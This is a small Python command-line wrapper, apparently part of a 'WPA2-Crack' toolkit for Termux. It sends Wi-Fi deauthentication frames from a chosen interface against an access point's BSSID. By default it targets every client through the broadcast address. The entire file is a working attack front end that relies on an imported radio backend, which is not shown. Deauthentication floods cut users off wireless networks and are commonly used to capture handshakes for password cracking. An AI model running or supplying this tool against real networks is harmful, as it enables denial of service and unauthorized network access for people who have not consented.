#!/usr/bin/env python3
"""
Legacy wrapper script for deauthenticating client from AP.
Author: Njörd
Updated for WPA2-Crack Termux / Python 3.13 Port.
"""

import argparse
import sys
from wpa2crack.radio import get_radio_backend, RadioBackendError

def main():
    parser = argparse.ArgumentParser(description="Deauthenticate client from AP")
    parser.add_argument("-i", "--interface", help="Network interface where packets will be sniffed", required=True)
    parser.add_argument("-b", "--bssid", help="Access point BSSID", required=True)
    parser.add_argument("-c", "--client", help="A client to target", default="ff:ff:ff:ff:ff:ff")
    args = parser.parse_args()

    radio = get_radio_backend()
    try:
        radio.send_deauth(args.interface, args.bssid, args.client)
    except RadioBackendError as e:
        sys.exit(f"\n[!] Live Wi-Fi Error:\n{e}\n")

if __name__ == "__main__":
    main()
